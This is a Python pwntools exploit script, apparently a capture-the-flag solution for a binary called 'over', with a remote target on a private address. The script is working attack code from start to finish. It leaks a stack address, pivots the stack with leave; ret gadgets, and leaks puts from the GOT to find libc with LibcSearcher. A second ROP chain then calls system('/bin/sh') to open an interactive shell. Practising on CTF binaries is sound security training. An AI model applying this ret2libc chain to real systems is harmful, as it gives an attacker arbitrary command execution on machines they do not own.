#!/usr/bin/env python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'
local = 1
if local:
	p = process('./over')
else:
	p = remote('10.21.13.69', 10005)
elf = ELF('./over')
g = lambda x: next(elf.search(asm(x)))
leave_ret = g('leave ; ret')
pop_rdi_ret = g('pop rdi ; ret')
read_plt = elf.plt['read']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
func = 0x400676
gdb.attach(p)

payload = cyclic(80)
p.sendafter('>', payload)
leak = p.recvuntil('\x7f')
offset = 0x7ffdbeeca6b0 - 0x7ffdbeeca640 # 0x70
stack = u64(leak[-6:].ljust(8, '\x00')) - offset
success('stack = ' + hex(stack))

payload = flat([
	flat([cyclic(8), pop_rdi_ret, puts_got, puts_plt, func]).ljust(80, '\x00'), 
	stack, 
	leave_ret
])
p.sendafter('>', payload)
leak = p.recvuntil('\x7f')
puts = u64(leak[-6:].ljust(8, '\x00'))
info('>>> SEARCH FOR libc <<<')
libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
success('libc_base = ' + hex(libc_base))
system = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')
success('system = ' + hex(system))
success('str_bin_sh = ' + hex(str_bin_sh))

offset2 = 0x7ffe31381810 - 0x7ffe313817e0 # 0x30
payload = flat([
	flat([cyclic(8), pop_rdi_ret, str_bin_sh, system]).ljust(80, '\x00'), 
	stack - offset2, 
	leave_ret
])
p.sendafter('>', payload)
p.interactive()
